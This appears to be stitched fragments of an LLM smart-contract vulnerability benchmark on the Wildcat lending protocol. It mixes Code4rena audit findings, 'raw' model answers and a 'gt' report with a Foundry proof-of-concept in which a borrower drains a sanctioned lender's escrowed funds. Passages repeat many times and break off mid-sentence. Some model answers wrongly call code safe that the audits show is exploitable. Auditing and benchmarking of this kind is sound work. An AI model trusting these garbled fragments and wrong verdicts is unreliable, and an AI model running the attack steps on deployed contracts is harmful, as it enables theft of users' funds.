in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets.\u201d**\n\nIt will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's **normalizedAmountPaid** number shows that it should be able to.\n\n## Proof Of Concept\n\nFor the following test, make sure you use the following parameters in **ExpectedStateTracker**.\n\n```solidity\nMarketParameters internal parameters = MarketParameters({\n        asset: address(0),\n        namePrefix: \"Wildcat \",\n

Withdrawal requests that could not be fully honored at the end of their withdrawal cycle are batched together, marked as expired withdrawals, and added to the withdrawal queue. These batches are tracked using the time of expiry, and when assets are returned to a market with a non-zero withdrawal queue, assets are immediately routed to the unclaimed withdrawals pool and can subsequently be claimed by lenders with the oldest expired withdrawals first.\n\nThe **withdrawalBatchDuration** can be set to zero so lenders do not have to wait before being able to withdraw funds from the market; however, this can cause issues where lenders in a batch can withdraw more than their pro-rata share of the batch's paid assets.\n\nA lender calls **queueWithdrawal** first to initiate the withdrawal; this will place it in a batch respective to its expiry.\n```solidity\nfunction queueWithdrawal(uint256 amount) external nonReentrant {\n        MarketState memory state = _getUpdatedState();\n\n        ...\n\n        // If there is no pending withdrawal batch, create a new one.\n        if (state.pendingWithdrawalExpiry == 0) {\n            state.pendingWithdrawalExpiry = uint32(block.timestamp + withdrawalBatchDuration);\n            emit WithdrawalBatchCreated(state.pendingWithdrawalExpiry);\n        }\n        // Cache batch expiry on the stack for gas savings.\n        uint32 expiry = state.pendingWithdrawalExpiry;\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n\n        // Add scaled withdrawal amount to account withdrawal status, withdrawal batch and market state.\n        _withdrawalData.accountStatuses[expiry][msg.sender].scaledAmount += scaledAmount;\n        batch.scaledTotalAmount += scaledAmount;\n        state.scaledPendingWithdrawals += scaledAmount;\n\n        emit WithdrawalQueued(expiry, msg.sender, scaledAmount);\n\n        // Burn as much of the withdrawal batch as possible with available liquidity.\n        uint256 availableLiquidity = batch.availableLiquidityForPendingBatch(state, totalAssets());\n        if (availableLiquidity > 0) {\n            _applyWithdrawalBatchPayment(batch, state, expiry, availableLiquidity);\n        }\n\n        // Update stored batch data\n        _withdrawalData.batches[expiry] = batch;\n\n        // Update stored state\n        _writeState(state);\n    }\n```\n\nNow once the **withdrawalBatchDuration** has passed, a lender can call **executeWithdrawal** to finalize the withdrawal. This will grab the batch and let the lender withdraw a percentage of the batch if the batch is not fully paid or all funds if it is fully paid.\n\n```solidity\nfunction executeWithdrawal(address accountAddress, uint32 expiry) external nonReentrant returns (uint256) {\n        if (expiry > block.timestamp) {\n            revert WithdrawalBatchNotExpired();\n        }\n        MarketState memory state = _getUpdatedState();\n\n        WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n        AccountWithdrawalStatus storage status = _withdrawalData.accountStatuses[expiry][accountAddress];\n\n        uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n        uint128 normalizedAmountWithdrawn = newTotalWithdrawn - status.normalizedAmountWithdrawn;\n        status.normalizedAmountWithdrawn = newTotalWithdrawn;\n        state.normalizedUnclaimedWithdrawals -= normalizedAmountWithdrawn;\n\n        ...\n\n        // Update stored state\n        _writeState(state);\n\n        return normalizedAmountWithdrawn;\n    }\n```\n\nLet's look at how this percentage is determined: the **newTotalWithdrawn** function determines a lender's available withdrawal amount by multiplying the **normalizedAmountPaid** with the **scaledAmount** and dividing the result by the batch's **scaledTotalAmount**. This ensures that each lender in the batch can withdraw an even amount of the available funds in the batch depending on their **scaledAmount**.\n\n```solidity\n uint128 newTotalWithdrawn =\n            uint128(MathUtils.mulDiv(batch.normalizedAmountPaid, status.scaledAmount, batch.scaledTotalAmount));\n```\n\nThis works fine when **withdrawalBatchDuration** is set over zero, as the batch values (except **normalizedAmountPaid**) are finalized. However, when set to zero, we can end up with lenders in a batch being able to withdraw more than **normalizedAmountPaid** in that batch, potentially violating protocol invariants.\n\nConsider the following scenario:\n\nThere is only 5 tokens available to burn\n\nLender A calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 5 = 5\n    \nLender A was able to fully withdraw.\n\nLender B comes along and calls **queueWithdrawal** with 5 and **executeWithdrawal** instantly in the same block.\n    \nThis will add to the same batch as lender A as it is the same expiry.\n    \nNow let's look at **newTotalWithdrawn** for Lender B.\n    \n    newTotalWithdrawn = (normalizedAmountPaid) * (scaledAmount) / scaledTotalAmount\n    \n    newTotalWithdrawn = 5 * 5 = 25 / 10 = 2.5\n    \nLets see what the batch looks like now\n  \n  - Lender A was able to withdraw 5 tokens in the batch\n\n  - Lender B was able to withdraw 2.5 tokens in the batch\n  \n  - The **batch.normalizedAmountPaid** is 5, meaning the Lenders' withdrawal amount surpassed the batch's current limit.\n\n## **Impact:**\n\nThis will break the following invariant in the protocol:\n\n\u201c**Withdrawal execution can only transfer assets that have been counted as paid assets in the corresponding batch, i.e. lenders with withdrawal requests can not withdraw more than their pro-rata share of the batch's paid assets.\u201d**\n\nIt will also mean that funds reserved for other batches may not be able to be fulfilled even if the batch's **normalizedAmountPaid** number shows that it should be able to.\n\n## Proof Of Concept\n\nFor the following test, make sure you use the following parameters in **ExpectedStateTracker**.\n\n```solidity\nMarketParameters internal parameters = MarketParameters({\n        asset: address(0),\n        namePrefix: \"Wildcat \",\n

                "raw": "Yes, the smart contract function `queueWithdrawal` is vulnerable to the \"Incorrect Token Withdrawal Calculation in Pool Exit Functions\" vulnerability type.\n\nReasoning:\n\n1. The vulnerability is due to an inaccurate withdrawal amount calculation, where the requested amount is scaled down by a factor derived from the pool's state. In this contract, the `scaledAmount` is calculated using the `scaleAmount` function from the `MarketState` memory object.\n2. The `queueWithdrawal` function uses this `scaledAmount` for further processing, such as updating the user's balance, withdrawal batch, and market state. This can lead to a discrepancy between the user's intended withdrawal amount and the scaled amount used in the request.\n3. The vulnerability is intensified by the fact that the contract's exit function is designed to handle exact withdrawal requirements strictly. If the requested amount is not met, the function may revert, denying the user the ability to withdraw their expected amount of tokens.\n\nTo mitigate this vulnerability, the `queueWithdrawal` function should calculate the withdrawal amount without the scaling factor and use the actual token amount needed, taking into account the pool's share allocation and redemption mechanism. This ensures that the precise token amount requested by the user is withdrawn and that any following operations dependent on those tokens can proceed without unexpected reverts.",

The design flaw is further exacerbated as the contract may revert if exact withdrawal requirements are not met, preventing users from withdrawing their intended amount of tokens. A mitigation for this vulnerability includes recalculating the withdrawal amount without using the scaling factor, ensuring precise token withdrawal based on the pool's share allocation and redemption mechanism.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly\n        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n```\n\n> EnumerableSet.sol\n```solidity\nfunction contains(AddressSet storage set, address value) internal view returns (bool) {\n    //@audit-info => Calls the internal _contains()\n    //@audit-info => If the given value is found it will return true, otherwise it will return false!\n    return _contains(set._inner, bytes32(uint256(uint160(value))));\n}\n\n//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!\n/**\n* @dev Returns true if the value is in the set. O(1).\n*/\nfunction _contains(Set storage set, bytes32 value) private view returns (bool) {\n    return set._indexes[value] != 0;\n}\n```\n\n> WildcatMarketConfig.sol\n```solidity\n  function updateAccountAuthorization(\n    address _account,\n    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!\n    bool _isAuthorized\n  ) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null\n    //@audit-info => If the account has been blacklisted, tx will revert!\n    Account memory account = _getAccount(_account);\n    if (_isAuthorized) {\n      account.approval = AuthRole.DepositAndWithdraw;\n    \n    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.\n    } else {\n      account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account;\n    _writeState(state);\n    emit AuthorizationStatusUpdated(_account, account.approval);\n  }\n```\n\n- So, at this point, the Lender has been able to move their MarketTokens to different accounts and to grant the WithdrawOnly Role to all of the accounts he wishes to.\n- Now they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved, any of those accounts have now the WithdrawOnly Role and have a balance of MarketTokens, so, the Lender will be able to exit the market from any of those accounts.\n\n\n## Tools Used\nManual Audit\n\n## Recommended Mitigation Steps\n- The mitigation for this problem is very straight-forward, limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), either only allow the Borrower to call it, or create a type of withelist of valid actors who are capable of updating the lender's authorization on the Markets, in this way, the Lenders won't be capable of granting the WithdrawOnly Role to any account they want to, thus, they won't be able even to attempt to escape the sanctions.\n\n> WildcatMarketController.sol\n```solidity\n- function updateLenderAuthorization(address lender, address[] memory markets) external {\n+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\nmodifier onlyAuthorizedEntities() {\n    require(msg.sender == <authorizedEntities>, \"you are not allowed sir\");\n    _;\n}\n```\n\n\n## Assessed type\n\nContext",

The `WildcatMarket` contract is responsible for enforcing the authorization checks and ensuring that the `lender` has the necessary permissions to perform the authorized actions.\n\nHowever, the vulnerability described in the given knowledge is about the system trusting the integrity of user-supplied parameters without adequate verification, relying solely on permissions granted at a higher level. In the provided code, the `lender` and `markets` parameters are not used in a way that would allow an attacker to bypass authorization checks. The code checks if the market is controlled by the contract, and it passes the `lender` address and the authorization status to the `WildcatMarket` contract, which is responsible for enforcing the authorization checks.\n\nIn conclusion, the provided smart contract function `updateLenderAuthorization` is not vulnerable to the \"[Authorization Bypass Through User-Controlled Parameter]\" vulnerability, as it enforces proper authorization checks and does not trust user-supplied parameters without adequate verification.",

It iterates through the provided `markets` array and calls the `updateAccountAuthorization` function of each market contract. The function `updateAccountAuthorization` takes two arguments: `lender` and `authorized`. The `lender` argument represents the address of the lender, while the `authorized` argument indicates whether the lender is already authorized or not.\n\nThe code checks if the current market is controlled by the contract using the `_controlledMarkets.contains(market)` function. If the market is not controlled, the function reverts the transaction with an error message `NotControlledMarket`. This ensures that only controlled markets can be affected by this function.\n\nFurthermore, the `WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));` line calls the `updateAccountAuthorization` function of the market contract and passes the `lender` address and the current authorization status of the `lender`. This allows the market contract to enforce proper checks on the caller's authorization before updating the authorization status of the lender.\n\nOverall, the code includes stringent verification that an actor has been granted the right to act on behalf of the original asset owner (lender) by checking if the market is controlled and if the lender has the required authorization status.

This indicates that the `WildcatMarket` contract is responsible for managing authorization, and the current contract only delegates the authorization update operation to it.\n\nSince the function checks if the market is controlled and properly delegates the authorization update operation to the `WildcatMarket` contract, it does not seem to be vulnerable to improper access control on delegated contract functions.\n\nHowever, it's important to note that the vulnerability might still exist in the `WildcatMarket` contract's `updateAccountAuthorization` function, which is not provided in the code snippet.

i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      //@audit-info => Forwards the value of the `lender` argument, and depending on the `lender` address is found in the _authorizedLenders EnumerableSet.AddressSet, will be forwarded a true or false accordingly\n        //@audit => If the lender address is not found in the _authorizedLenders variable, it will forward a false to the Market::updateAccountAuthorization() function\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n```\n\n> EnumerableSet.sol\n```solidity\nfunction contains(AddressSet storage set, address value) internal view returns (bool) {\n    //@audit-info => Calls the internal _contains()\n    //@audit-info => If the given value is found it will return true, otherwise it will return false!\n    return _contains(set._inner, bytes32(uint256(uint160(value))));\n}\n\n//@audit-info => The internal function will just return a true or false if the given value is in the set or not, but the tx won't be reverted!\n/**\n* @dev Returns true if the value is in the set. O(1).\n*/\nfunction _contains(Set storage set, bytes32 value) private view returns (bool) {\n    return set._indexes[value] != 0;\n}\n```\n\n> WildcatMarketConfig.sol\n```solidity\n  function updateAccountAuthorization(\n    address _account,\n    //@audit-info => For any account that is not registered in the `_authorizedLenders` of the Controller, this flag was set as false!\n    bool _isAuthorized\n  ) external onlyController nonReentrant {\n    MarketState memory state = _getUpdatedState();\n    //@audit-info => If the accountAddress is not registered in the storage, the approval role is set to Null\n    //@audit-info => If the account has been blacklisted, tx will revert!\n    Account memory account = _getAccount(_account);\n    if (_isAuthorized) {\n      account.approval = AuthRole.DepositAndWithdraw;\n    \n    //@audit => Any account not registered in the Controller will be assigned the WithdrawOnly role.\n    } else {\n      account.approval = AuthRole.WithdrawOnly;\n    }\n    _accounts[_account] = account;\n    _writeState(state);\n    emit AuthorizationStatusUpdated(_account, account.approval);\n  }\n```\n\n- So, at this point, the Lender has been able to move their MarketTokens to different accounts and to grant the WithdrawOnly Role to all of the accounts he wishes to.\n- Now they can decide to exit the Market by queuing and executing some withdrawal requests from the different accounts where the MarketTokens were moved, any of those accounts have now the WithdrawOnly Role and have a balance of MarketTokens, so, the Lender will be able to exit the market from any of those accounts.\n\n\n## Tools Used\nManual Audit\n\n## Recommended Mitigation Steps\n- The mitigation for this problem is very straight-forward, limiting the access to which entities can call the [`WildcatMarketController::updateLenderAuthorization()` function](https://github.com/code-423n4/2023-10-wildcat/blob/main/src/WildcatMarketController.sol#L182-L190), either only allow the Borrower to call it, or create a type of withelist of valid actors who are capable of updating the lender's authorization on the Markets, in this way, the Lenders won't be capable of granting the WithdrawOnly Role to any account they want to, thus, they won't be able even to attempt to escape the sanctions.\n\n> WildcatMarketController.sol\n```solidity\n- function updateLenderAuthorization(address lender, address[] memory markets) external {\n+ function updateLenderAuthorization(address lender, address[] memory markets) external onlyAuthorizedEntities(){\n    for (uint256 i; i < markets.length; i++) {\n      address market = markets[i];\n      if (!_controlledMarkets.contains(market)) {\n        revert NotControlledMarket();\n      }\n      WildcatMarket(market).updateAccountAuthorization(lender, _authorizedLenders.contains(lender));\n    }\n  }\n\nmodifier onlyAuthorizedEntities() {\n    require(msg.sender == <authorizedEntities>, \"you are not allowed sir\");\n    _;\n}\n```\n\n\n## Assessed type\n\nContext",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

Specifically, the code calculates the new total withdrawn amount (`newTotalWithdrawn`) and the normalized amount withdrawn (`normalizedAmountWithdrawn`). It then updates the account status by setting the `normalizedAmountWithdrawn` to `newTotalWithdrawn`. The code also checks if the `normalizedAmountWithdrawn` is zero before proceeding with the transfer.\n\nFurthermore, the code checks if the account is sanctioned and if so, it creates an escrow and transfers the normalized amount withdrawn to the escrow. If the account is not sanctioned, it transfers the normalized amount withdrawn directly to the account address.\n\nTherefore, it appears that the smart contract code takes into account the locked funds during asset withdrawal and updates the shares accordingly.\n\nHowever, it is still important to thoroughly test the smart contract code and perform a formal security audit to ensure that there are no other vulnerabilities present.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

        "gt": "\n# Vulnerability details\n\n## Impact\n\nThe `WildcatMarketBase#_blockAccount()` function that is used to block a sanctioned lender contains a critical bug. It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines whether `releaseEscrow()` should proceed or revert:\n\n```solidity\nfunction canReleaseEscrow() public view override returns (bool) {\n\t//@audit                                                 Larry      Bob\n\t//                                                         \u2193         \u2193\n\treturn !WildcatSanctionsSentinel(sentinel).isSanctioned(borrower, account);\n}\n```\n\nThe misordered parameters impact the return value of `sentinel.isSanctioned()`. It mistakenly checks Bob against the sanctions list, where he is not sanctioned.\n\n```solidity\n//@audit                       Larry              Bob\n//                               \u2193                 \u2193\nfunction isSanctioned(address borrower, address account) public view override returns (bool) {\n return\n   !sanctionOverrides[borrower][account] && // true\n   IChainalysisSanctionsList(chainalysisSanctionsList).isSanctioned(account); // false\n}\n```\n\nThus `isSanctioned()` returns `false` and consequently `canReleaseEscrow()` returns `true`. This allows Bob to successfully execute `releaseEscrow()` and drain all of Larry's market tokens:\n\n```solidity\nfunction releaseEscrow() public override {\n  if (!canReleaseEscrow()) revert CanNotReleaseEscrow();\n\n  uint256 amount = balance();\n  \n  //@audit                 Bob   Larry's $\n  //                        \u2193       \u2193\n  IERC20(asset).transfer(account, amount);\n\n  emit EscrowReleased(account, asset, amount);\n}\n```\n\nAfter this, Bob simply needs to authorize himself as a lender in his own market and withdraw the actual assets.\n\nBelow is a PoC demonstrating how to execute the exploit.\n\nTo proceed, please include the following import statements in `test/market/WildcatMarketConfig.t.sol`:\n\n```solidity\nimport 'src/WildcatSanctionsEscrow.sol';\n\nimport \"forge-std/console2.sol\";\n```\n\nAdd the following test `test/market/WildcatMarketConfig.t.sol` as well:\n\n```solidity\nfunction test_borrowerCanStealSanctionedLendersFunds() external {\n  vm.label(borrower, \"bob\"); // Label borrower for better trace readability\n\n  // This is Larry The Lender\n  address larry = makeAddr(\"larry\");\n\n  // Larry deposists 10e18 into Bob's market\n  _deposit(larry, 10e18);\n\n  // Larry's been a bad guy and gets sanctioned\n  sanctionsSentinel.sanction(larry);\n\n  // Larry gets nuked by the borrower\n  vm.prank(borrower);\n  market.nukeFromOrbit(larry);\n\n  // The vulnerable escrow in which Larry's funds get moved\n  address vulnerableEscrow = sanctionsSentinel.getEscrowAddress(larry, borrower, address(market));\n  vm.label(vulnerableEscrow, \"vulnerableEscrow\");\n\n  // Ensure Larry's funds have been moved to his escrow\n  assertEq(market.balanceOf(larry), 0);\n  assertEq(market.balanceOf(vulnerableEscrow), 10e18);\n\n  // Malicious borrower is able to release the escrow due to the vulnerability\n  vm.prank(borrower);\n  WildcatSanctionsEscrow(vulnerableEscrow).releaseEscrow();\n\n  // Malicious borrower has all of Larry's tokens\n  assertEq(market.balanceOf(borrower), 10e18);\n\n  // The borrower authorizes himself as a lender in the market\n  _authorizeLender(borrower);\n\n  // Queue withdrawal of all funds\n  vm.prank(borrower);\n  market.queueWithdrawal(10e18);\n\n  // Fast-forward to when the batch duration expires\n  fastForward(parameters.withdrawalBatchDuration);\n  uint32 expiry = uint32(block.timestamp);\n\n  // Execute the withdrawal\n  market.executeWithdrawal(borrower, expiry);\n\n  // Assert the borrower has drained all of Larry's assets\n  assertEq(asset.balanceOf(borrower), 10e18);\n}\n```\n\nRun the PoC like this:\n\n```sh\nforge test --match-test test_borrowerCanStealSanctionedLendersFunds -vvvv\n```\n\n## Tools Used\n\nManual review\n## Recommended Mitigation Steps\n\n1.

It incorrectly calls `IWildcatSanctionsSentinel(sentinel).createEscrow()` with misordered arguments, accidentially creating a vulnerable escrow that enables the borrower to drain all the funds of the sanctioned lender.\n\nThe execution of withdrawals (`WildcatMarketWithdrawals#executeWithdrawal()`) also performs a check if the the `accountAddress` is sanctioned and if it is, and escrow is created and the amount that was to be sent to the lender is sent to the escrow. That escrow, however, is also created with the `account` and `borrower` arguments in the wrong order. \n\nThat means wether or not the borrower has anything to do with a sanctioned account and their funds ever, that account will never be able to get their money back in case their sanction gets dismissed.\n\n## Proof of Concept\n\nConsider this scenario to illustrate how the issue can be exploited.\n\n1. Bob The Borrower creates a market.\n2. Bob authorizes Larry The Lender as a lender in the created market.\n3. Larry deposits funds into the market\n4. Larry gets sanctioned in Chainalysis\n5. Bob invokes `WildcatMarket#nukeFromOrbit(larryAddress)`, blocking Larry and creating a vulnerable `WildcatSanctionsEscrow` where Larry's market tokens are transferred.\n7. Bob authorizes himself as a lender in the market via `WildcatMarketController#authorizeLenders(bobAddress)` \n8. Bob initiates a withdrawal using  `WildcatMarket#queueWithdrawal()`\n9. After the withdrawal batch duration expires, Bob calls `WildcatMarket#executeWithdrawal()` - and gains access to all of Larry's assets.\n\nNow, let's delve into the specifics and mechanics of the vulnerability.\n\nThe `nukeFromOrbit()` function calls `_blockAccount(state, larryAddress)`, blocking Larry's account, creating an escrow, and transferring his market tokens to that escrow.\n\n```solidity\n//@audit                                                     Larry\n//@audit                                                       \u2193\nfunction _blockAccount(MarketState memory state, address accountAddress) internal {\n  Account memory account = _accounts[accountAddress];\n  // ...\n  account.approval = AuthRole.Blocked;\n  // ...\n  account.scaledBalance = 0;\n  address escrow = IWildcatSanctionsSentinel(sentinel).createEscrow(\n\taccountAddress, //@audit \u2190 Larry\n\tborrower,       //@audit \u2190 Bob\n\taddress(this)\n  );\n  // ...\n  _accounts[escrow].scaledBalance += scaledBalance;\n  // ...\n}\n```\n\nIn the code snippet, notice the order of arguments passed to `createEscrow()`:\n\n```solidity\ncreateEscrow(accountAddress, borrower, address(this));\n```\n\nHowever, when we examine the `WildcatSanctionsSentinel#createEscrow()` implementation, we see a different order of arguments. This results in an incorrect construction of `tmpEscrowParams`:\n\n```solidity\nfunction createEscrow(\n\taddress borrower, //@audit \u2190 Larry\n\taddress account,  //@audit \u2190 Bob\n\taddress asset\n) public override returns (address escrowContract) {\n  // ...\n  // @audit                        ( Larry  ,   Bob  , asset)\n  // @audit                            \u2193         \u2193       \u2193\n  tmpEscrowParams = TmpEscrowParams(borrower, account, asset);\n  new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();\n  // ...\n}\n```\n\nThe `tmpEscrowParams` are essential for setting up the escrow correctly. They are fetched in the constructor of `WildcatSanctionsEscrow`, and the order of these parameters is significant:\n\n```solidity\nconstructor() {\n  sentinel = msg.sender;  \n  (borrower, account, asset) = WildcatSanctionsSentinel(sentinel).tmpEscrowParams();\n//     \u2191        \u2191       \u2191   \n//(  Larry ,   Bob  , asset) are the params fetched here. @audit\n}\n```\n\nHowever, due to the misordered arguments in `_blockAccount()`, what's passed as `tmpEscrowParams` is `(borrower = Larry, account = Bob, asset)`, which is incorrect. This misordering affects the `canReleaseEscrow()` function, which determines 